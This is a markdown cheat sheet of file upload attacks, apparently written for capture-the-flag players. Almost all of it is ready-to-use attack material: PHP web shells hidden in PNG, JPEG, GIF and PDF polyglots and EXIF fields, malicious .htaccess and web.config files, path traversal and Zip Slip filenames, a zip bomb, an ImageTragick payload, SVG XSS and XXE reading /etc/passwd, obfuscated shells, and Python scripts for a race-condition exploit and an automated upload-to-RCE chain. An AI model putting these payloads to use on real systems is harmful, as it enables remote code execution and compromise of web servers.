# File Upload - Advanced Bypasses & Exploitation

## Advanced Extension Bypasses

### 1. Case Sensitivity Tricks

```
shell.PHP
shell.PhP
shell.pHp
shell.phP
SHELL.PHP
Shell.Php
```

**Why it works**: Some systems are case-sensitive, filters might not be.

---

### 2. Special Characters in Extension

```
shell.php....
shell.php%20
shell.php::$DATA     (Windows NTFS Alternate Data Stream)
shell.php.
shell.php<space>
shell.php%00
```

---

### 3. Double Extensions

#### Concept
Server processes extensions left-to-right or right-to-left.

```
shell.php.jpg        # Might execute as PHP
shell.jpg.php        # Might bypass filter
shell.php.png
shell.txt.php
shell.pdf.php
```

**Apache mod_mime**: Processes right-to-left
```
shell.php.jpg  → Sees .jpg (safe) but executes .php
```

---

### 4. Adding Dots and Slashes

```
shell.php.
shell.php..
shell.php/
shell.php.\
shell.php%00
```

**Windows specific**:
```
shell.php:$DATA      # Alternate data stream
shell.php::$DATA
shell.php<<<
```

---

### 5. Unicode / UTF-8 Tricks

```
shell.ph\xF0\x9F\x92\xA9p    # Emoji in extension
shell.ph%C0%AEp              # Overlong UTF-8 encoding
shell.ph%C0%2Ep              # Null byte alternative
```

---

## MIME Type Advanced Bypasses

### Understanding MIME Types

```http
Content-Type: image/jpeg     ← This is MIME type
Content-Type: image/png
Content-Type: application/pdf
```

### Common MIME Types

```
Images:
- image/jpeg
- image/png
- image/gif
- image/bmp
- image/svg+xml

Documents:
- application/pdf
- application/msword
- application/vnd.ms-excel
- text/plain

Other:
- application/octet-stream
- application/x-php
```

---

### MIME Type Bypass Techniques

#### 1. Set Valid Image MIME but Upload PHP

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← Fake MIME type

<?php system($_GET['cmd']); ?>
------Boundary--
```

#### 2. Multiple Content-Type Headers

```http
Content-Type: image/jpeg
Content-Type: application/x-php
```

#### 3. Empty Content-Type

```http
Content-Type: 
```

---

## Magic Bytes (File Signature) Advanced

### Creating Polyglot Files

#### PNG + PHP Polyglot

**Method 1: Manual**
```bash
# PNG magic bytes
echo -en '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php.png

# Add minimal PNG structure
echo -en '\x00\x00\x00\x0DIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89' >> shell.php.png
echo -en '\x00\x00\x00\x0AIDAT\x08\x5B\x63\x60\x00\x00\x00\x02\x00\x01\xe2\x21\xbc\x33' >> shell.php.png
echo -en '\x00\x00\x00\x00IEND\xae\x42\x60\x82' >> shell.php.png

# Add PHP code
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
```

**Method 2: Using existing image**
```bash
cat real-image.png > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
```

---

#### JPEG + PHP Polyglot

```bash
# JPEG magic bytes
echo -en '\xFF\xD8\xFF\xE0\x00\x10JFIF' > shell.php.jpg

# Add PHP code
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Add JPEG end marker
echo -en '\xFF\xD9' >> shell.php.jpg
```

---

#### GIF + PHP Polyglot

```bash
# GIF header (very simple)
printf 'GIF89a' > shell.php.gif
printf '<?php system($_GET["cmd"]); ?>' >> shell.php.gif
```

**Or one-liner:**
```bash
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

---

#### PDF + PHP Polyglot

```bash
# Minimal PDF structure
cat > shell.php.pdf << 'EOF'
%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
trailer<</Size 4/Root 1 0 R>>
startxref
190
<?php system($_GET['cmd']); ?>
%%EOF
EOF
```

---

### EXIF Data Injection

#### Using exiftool

```bash
# Inject PHP in comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# Inject in other fields
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' image.jpg
exiftool -Description='<?php system($_GET["cmd"]); ?>' image.jpg
```

#### Using gifsicle (for GIF)

```bash
gifsicle --comment '<?php system($_GET["cmd"]); ?>' image.gif > shell.gif
```

---

## Path Traversal in Upload

### Bypass Filename Sanitization

#### Basic Path Traversal

```
../shell.php
../../shell.php
../../../var/www/html/shell.php
```

#### With Encoding

```
..%2fshell.php
..%252fshell.php
..%5cshell.php      (Windows)
```

#### Double Encoding

```
..%252f..%252fshell.php
```

#### Null Byte

```
../../shell.php%00.jpg
../../../var/www/html/shell.php%00.png
```

#### Special Sequences

```
....//shell.php
..../shell.php
....\/shell.php
..;/shell.php
```

---

### Overwrite Existing Files

```
# Overwrite index.php
filename: "../index.php"

# Overwrite .htaccess
filename: "../.htaccess"

# Overwrite config
filename: "../../config.php"
```

---

## .htaccess Exploitation

### Upload Malicious .htaccess

#### Execute Images as PHP

```apache
# .htaccess content
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .bmp
```

**Then upload**: `shell.jpg` with PHP code inside.

---

#### Alternative Syntax

```apache
# Another way
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

---

#### Disable PHP Security

```apache
# Disable open_basedir
php_admin_value open_basedir none

# Allow dangerous functions
php_admin_value disable_functions ""

# Enable allow_url_include
php_admin_value allow_url_include 1
```

---

#### Bypass Extension Restrictions

```apache
# Make shell.txt executable as PHP
AddType application/x-httpd-php .txt
```

---

## web.config Exploitation (IIS)

### Upload Malicious web.config

#### Execute Images as ASPX

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="ImageHandler" 
              path="*.jpg" 
              verb="*" 
              type="System.Web.UI.PageHandlerFactory" 
              resourceType="Unspecified" 
              requireAccess="Script" 
              preCondition="integratedMode" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".jpg" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

---

#### Direct Code Execution

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="test" path="shell.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\Windows\System32\inetsrv\asp.dll" resourceType="Unspecified" />
      </handlers>
   </system.webServer>
</configuration>
```

---

## Race Condition Exploitation

### Concept
Upload file → File is briefly accessible → Validation deletes it → Need to access during this window.

### Attack Script

```python
import requests
import threading

url = "http://target.com/upload.php"
shell_url = "http://target.com/uploads/shell.php"

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        requests.post(url, files=files)

def access():
    while True:
        try:
            r = requests.get(shell_url + "?cmd=echo 'SUCCESS' > /tmp/pwned")
            if "SUCCESS" in r.text or r.status_code == 200:
                print("[+] Shell executed successfully!")
                break
        except:
            pass

# Start upload thread
upload_thread = threading.Thread(target=upload)
upload_thread.daemon = True
upload_thread.start()

# Start access thread
access_thread = threading.Thread(target=access)
access_thread.start()
```

---

## File Upload + LFI Chain

### Step-by-Step Exploitation

#### Step 1: Upload File with PHP Code

Even if it's renamed or has wrong extension:

```bash
# Upload as image
curl -F "file=@malicious.jpg" http://target.com/upload.php
```

**malicious.jpg content**:
```
GIF89a
<?php system($_GET['cmd']); ?>
```

---

#### Step 2: Find Upload Location

Common paths:
```
/uploads/
/files/
/tmp/
/var/tmp/
```

Check response for filename:
```json
{"success": true, "filename": "abc123.jpg", "path": "/uploads/abc123.jpg"}
```

---

#### Step 3: Include via LFI

```
http://target.com/index.php?page=/uploads/abc123.jpg&cmd=id
http://target.com/index.php?page=../../../../var/tmp/uploaded_file&cmd=id
```

---

### PHP Session Upload + LFI

#### Exploit PHP Session

```bash
# Step 1: Poison session
curl -b "PHPSESSID=attacker123" http://target.com/ -F "username=<?php system(\$_GET['cmd']); ?>"

# Step 2: Include session file via LFI
curl "http://target.com/index.php?page=/var/lib/php/sessions/sess_attacker123&cmd=id"
```

---

## Zip Upload Exploitation

### Zip Slip Vulnerability

#### Create Malicious Zip

```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Create zip with path traversal
ln -s shell.php ../../../var/www/html/shell.php
zip --symlinks shell.zip shell.php ../../../var/www/html/shell.php

# Or using Python
python3 << 'EOF'
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
EOF
```

---

### Zip Bomb (DoS)

```bash
# Create zip bomb
dd if=/dev/zero bs=1M count=1024 | zip bomb.zip -
```

---

## Image Processing Vulnerabilities

### ImageTragick (CVE-2016-3714)

#### Exploit ImageMagick

```bash
# Create malicious image
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
EOF

# Convert to different formats
convert exploit.mvg exploit.png
convert exploit.mvg exploit.jpg
```

---

### SVG File Upload

#### Malicious SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    alert('XSS');
  </script>
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
</svg>
```

#### SVG with XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="15">&xxe;</text>
</svg>
```

---

## Advanced Web Shells

### Tiny PHP Shell

```php
<?=`$_GET[0]`?>
```
Usage: `?0=whoami`

### PHP Shell with Eval

```php
<?php eval($_POST['cmd']); ?>
```
Usage: POST `cmd=system('id');`

### Obfuscated Shell

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
$a($b);
?>
```
Usage: `?a=system&b=id`

### Base64 Encoded Shell

```php
<?php
eval(base64_decode($_POST['cmd']));
?>
```
Usage: POST `cmd=c3lzdGVtKCdpZCcpOw==`  (base64 of `system('id');`)

---

## CTF-Specific Techniques

### 1. Check for Unrestricted Upload

```bash
# Try uploading shell.php directly
curl -F "file=@shell.php" http://target.com/upload.php
```

### 2. Enumerate File Extensions

```bash
# Test multiple extensions
for ext in php php3 php4 php5 php7 phtml phar phpt; do
    curl -F "file=@shell.$ext" http://target.com/upload.php
    echo "Tested: shell.$ext"
done
```

### 3. Find Upload Directory

```bash
# Common paths
curl http://target.com/uploads/shell.php
curl http://target.com/files/shell.php
curl http://target.com/images/shell.php
```

### 4. Check Response for Clues

Upload and check JSON response:
```json
{
  "success": true,
  "path": "/uploads/abc123.php",
  "url": "http://target.com/uploads/abc123.php"
}
```

### 5. Combine with Other Vulns

- Upload + LFI
- Upload + Path Traversal
- Upload + XXE (in SVG/XML files)
- Upload + SSRF (fetch uploaded file)

---

## Automation with Python

### Complete Upload Exploit

```python
import requests
import sys

def exploit(url, cmd):
    # Step 1: Upload shell
    files = {
        'file': ('shell.php.jpg', 
                 'GIF89a<?php system($_GET["cmd"]); ?>', 
                 'image/gif')
    }
    
    r = requests.post(url + '/upload.php', files=files)
    print(f"[*] Upload response: {r.status_code}")
    
    # Step 2: Try to access shell
    paths = [
        '/uploads/shell.php.jpg',
        '/files/shell.php.jpg',
        '/images/shell.php.jpg'
    ]
    
    for path in paths:
        try:
            r = requests.get(url + path, params={'cmd': cmd})
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] Shell found at: {path}")
                print(f"[+] Output:\n{r.text}")
                return
        except:
            pass
    
    print("[-] Shell not found")

if __name__ == "__main__":
    exploit("http://target.com", "cat /flag.txt")
```

---

## Tools

- **Burp Suite**: Intercept and modify uploads
- **Weevely**: Generate obfuscated PHP shells
- **msfvenom**: Generate various payloads
- **exiftool**: Inject code in metadata
- **ffuf/gobuster**: Find upload directories

---

## Quick Commands Reference

```bash
# Create GIF polyglot
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif

# Create PNG polyglot
cat real.png > shell.php.png && echo '<?php system($_GET["c"]); ?>' >> shell.php.png

# Inject EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg -o shell.jpg

# Upload with curl
curl -F "file=@shell.php" http://target.com/upload.php

# Test shell
curl "http://target.com/uploads/shell.php?c=id"
```

---

## Remember

1. **Always try simple first**: Upload shell.php directly
2. **Check response carefully**: Often reveals upload path
3. **Try multiple bypasses**: Extensions, MIME, magic bytes
4. **Combine techniques**: Polyglots work best
5. **Use tools**: Burp Suite for quick testing
6. **Think creatively**: .htaccess, web.config, path traversal

**File upload is one of the most common ways to get RCE in CTFs!**